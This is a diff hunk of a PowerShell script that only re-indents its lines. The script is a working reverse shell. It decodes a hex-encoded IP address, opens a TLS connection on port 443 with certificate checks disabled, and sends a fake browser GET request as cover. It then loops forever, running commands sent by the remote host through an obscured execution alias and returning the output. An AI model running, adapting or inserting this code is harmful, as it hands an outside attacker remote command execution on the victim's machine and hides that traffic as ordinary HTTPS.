@@ -18,22 +18,22 @@ while ($true) {
 	$p = ($px | ForEach { [convert]::ToInt32($_,16) }) -join '.'
 	$pt = "443"
 	$hname = "$env:computername";
-    $w = "GET /index.html HTTP/1.1`r`nHost: $p`r`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0`r`nAccept: text/html`r`n`r`n"
-    $s = [System.Text.ASCIIEncoding]
-    [byte[]]$b = 0..65535|%{0}
-    $y = New-Object System.Net.Sockets.TCPClient($p,$pt)
-    $z = $y.GetStream()
-    $sl = New-object System.Net.Security.SslStream ($z, $false, { param($Sender, $Cert, $Chain, $Policy) return $true}) 
-    $sl.AuthenticateAsClient($hname,$null,[System.Security.Authentication.SslProtocols]::Tls12, $false)
-    $d = $s::UTF8.GetBytes($w)
-    $sl.Write($d, 0, $d.Length)
-    $t = (new-exercise whoami) + "$ "
-    while(($l = $sl.Read($b, 0, $b.Length)) -ne 0){
-        $v = (New-Object -TypeName $s).GetString($b,0, $l)        
-        $d = $s::UTF8.GetBytes((new-exercise $v 2>&1 | Out-String )) + $s::UTF8.GetBytes($t)
-        $sl.Write($d, 0, $d.Length)
-    }
-    $y.Close()
-    Start-Sleep -Seconds 5
+	$w = "GET /index.html HTTP/1.1`r`nHost: $p`r`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0`r`nAccept: text/html`r`n`r`n"
+	$s = [System.Text.ASCIIEncoding]
+	[byte[]]$b = 0..65535|%{0}
+	$y = New-Object System.Net.Sockets.TCPClient($p,$pt)
+	$z = $y.GetStream()
+	$sl = New-object System.Net.Security.SslStream ($z, $false, { param($Sender, $Cert, $Chain, $Policy) return $true}) 
+	$sl.AuthenticateAsClient($hname,$null,[System.Security.Authentication.SslProtocols]::Tls12, $false)
+	$d = $s::UTF8.GetBytes($w)
+	$sl.Write($d, 0, $d.Length)
+	$t = (new-exercise whoami) + "$ "
+	while(($l = $sl.Read($b, 0, $b.Length)) -ne 0){
+		$v = (New-Object -TypeName $s).GetString($b,0, $l)        
+		$d = $s::UTF8.GetBytes((new-exercise $v 2>&1 | Out-String )) + $s::UTF8.GetBytes($t)
+		$sl.Write($d, 0, $d.Length)
+	}
+	$y.Close()
+	Start-Sleep -Seconds 5
 }
 
